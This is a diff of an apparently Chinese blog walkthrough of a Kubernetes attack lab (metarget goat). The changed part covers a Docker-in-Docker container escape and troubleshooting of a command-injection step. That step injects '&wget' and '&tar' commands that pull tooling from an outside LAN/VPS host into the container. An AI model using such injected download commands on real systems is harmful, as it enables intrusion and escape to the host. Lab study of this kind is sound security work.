@@ -410,21 +410,21 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2025-05-09
+                    2025-05-14
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    6.7k
+                    9.4k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    27 分
+                    37 分
                 </div>
                 
 
@@ -1117,7 +1117,7 @@ Date:   Fri Nov <span class="token number">6</span> <span class="token number">2
 
 <p>同样可以看到它包含了硬编码的AWS密钥以及flag。</p>
 <p>获取到AWS的访问密钥（<code>aws_access_key_id</code> 和 <code>aws_secret_access_key</code>）后，黑客可以以该密钥所属的IAM用户或角色的权限执行任意操作。</p>
-<h2 id="3-2-DIND-docker-in-docker-exploitation"><a href="#3-2-DIND-docker-in-docker-exploitation" class="headerlink" title="3.2 DIND (docker-in-docker) exploitation"></a>3.2 DIND (docker-in-docker) exploitation</h2><p>如何在容器中利用Docker IN Docker套接字。</p>
+<h2 id="3-2-DIND-docker-in-docker-exploitation"><a href="#3-2-DIND-docker-in-docker-exploitation" class="headerlink" title="3.2 DIND (docker-in-docker) exploitation"></a>3.2 DIND (docker-in-docker) exploitation</h2><p>如何在容器中利用Docker IN Docker套接字逃逸访问宿主机。</p>
 <blockquote>
 <h4 id="DIND-docker-in-docker"><a href="#DIND-docker-in-docker" class="headerlink" title="DIND (docker-in-docker)"></a>DIND (docker-in-docker)</h4><p>DIND（Docker-in-Docker）是一种在 Docker 容器内运行另一个 Docker 守护进程（Docker Daemon）的技术。这种模式通常用于需要<strong>在容器内部管理其他容器</strong>的场景（例如 CI/CD 流水线中的容器化构建环境），但它也带来了一些复杂性和潜在问题。</p>
 <ul>
@@ -1202,7 +1202,7 @@ Date:   Fri Nov <span class="token number">6</span> <span class="token number">2
 <ul>
 <li>此场景的目标是从正在运行的 Docker 容器中逃逸到运行该容器的宿主系统，并能够访问和对该节点上运行的其他容器执行操作。</li>
 </ul>
-<h3 id="3-2-3-实践"><a href="#3-2-3-实践" class="headerlink" title="3.2.3 实践"></a>3.2.3 实践</h3><ul>
+<h3 id="3-2-3-实践-metarget-goat"><a href="#3-2-3-实践-metarget-goat" class="headerlink" title="3.2.3 实践[metarget-goat]"></a>3.2.3 实践[metarget-goat]</h3><ul>
 <li>命令注入漏洞</li>
 </ul>
 <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-07%2018.12.34.png" style="zoom:50%;">
@@ -1267,27 +1267,282 @@ sysfs on /sys <span class="token builtin class-name">type</span> sysfs <span cla
 
 <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-08%2016.02.50.png" style="zoom:50%;">
 
-<p>可以看到程序已经成功下载到tmp目录中。</p>
-<p>3）解压</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">;</span><span class="token function">tar</span> <span class="token parameter variable">-xvf</span> /tmp/crictl-v1.27.1.tar.gz <span class="token parameter variable">-C</span> /tmp/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>可以看到程序已经成功下载到tmp目录中，但是用<code>ls -lh</code>查看大小为0，实际上只下载了个空壳，所以tar解压的时候会报错。</p>
+<blockquote>
+<h4 id="下载出错问题处理"><a href="#下载出错问题处理" class="headerlink" title="下载出错问题处理"></a>下载出错问题处理</h4><ul>
+<li>检测tar命令是否存在，可以看到是存在的</li>
+</ul>
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-13%2015.33.14.png" style="zoom:40%;">
 
-<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-08%2016.20.07.png" style="zoom:50%;">
-
-<p><strong>退出码 2</strong> 的通用含义：<strong>参数错误、文件未找到或权限问题</strong>。</p>
-<p><code>;tar -xvf /tmp/crictl-v1.27.1.tar.gz </code>同样报错。</p>
-<p>⚠️：<code>原因为在minikube搭建的goat靶场环境中，tar命令缺失。</code></p>
 <ul>
-<li>操作宿主机docker守护进程</li>
+<li><code>&amp;tar -xvf /tmp/crictl-v1.27.1.tar.gz -C /tmp/</code>执行时返回<code>exit status 2</code>错误，查看tmp目录，没有解压成功。</li>
+</ul>
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-13%2015.35.41.png" style="zoom:40%;">
+
+<ul>
+<li>排查是否是文件本身的问题<code>&amp;ls -lh /tmp/crictl-v1.27.1.tar.gz</code>，执行之后返回</li>
+</ul>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">-rw-r--r-- <span class="token number">1</span> root root <span class="token number">0</span> May <span class="token number">13</span> 07:20 /tmp/crictl-v1.27.1.tar.gz<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>文件 <code>/tmp/crictl-v1.27.1.tar.gz</code> 的大小为 <strong>0</strong>（<code>root root 0</code>），这意味着文件 <strong>未被正确下载或写入</strong>，导致解压失败。</p>
+<ul>
+<li>在本地尝试用curl下载crictl-v1.27.1.tar.gz，是网络问题导致无法下载。</li>
+</ul>
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-13%2015.46.17.png" style="zoom:50%;">
+
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> <span class="token parameter variable">-L</span> <span class="token parameter variable">-o</span> /tmp/crictl-v1.27.1-2.tar.gz https://github.com/kubernetes-sigs/cri-tools/releases/download/v1.27.1/crictl-v1.27.1-linux-amd64.tar.gz<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>返回 exit status 6。</p>
+<p>遇到 <code>curl</code> 返回 <strong>exit status 6</strong> 错误时，通常表示 <strong>无法解析目标域名</strong>（DNS 解析失败或网络不通）。</p>
+<p>但是baidu.com、github.com可以访问通，可以连接互联网。</p>
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-13%2015.51.31.png" style="zoom:50%;">
+
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-13%2015.56.22.png" style="zoom:50%;">
+
+<p>且ip地址如下：</p>
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-13%2015.52.39.png" style="zoom:50%;">
+
+<ul>
+<li>下载其他版本</li>
+</ul>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">crictl-v1.33.0-linux-amd64.tar.gz
+https://github.com/kuernetes-sigs/cri-tools/releases/download/v1.33.0/crictl-v1.33.0-linux-amd64.tar.gz
+
+<span class="token operator">&amp;</span><span class="token function">wget</span> https://github.com/kubernetes-sigs/cri-tools/releases/download/v1.33.0/crictl-v1.33.0-linux-amd64.tar.gz <span class="token parameter variable">-O</span> /tmp/crictl-v1.33.0-linux-amd64.tar.gz<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-13%2015.58.02.png" style="zoom:50%;">
+
+<p>执行之后会长时间延迟，可能正在下载文件。但还是会由于网络原因下载失败。</p>
+<ul>
+<li>将tar包放在局域网/vps上供下载</li>
+</ul>
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-14%2013.29.04.png" style="zoom:30%;">
+
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-14%2013.29.52.png" style="zoom:50%;">
+
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">&amp;</span><span class="token function">wget</span> http://192.168.52.13:8000/crictl-v1.33.0-linux-amd64.tar.gz <span class="token parameter variable">-O</span> /tmp/crictl-1.tar.gz<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSI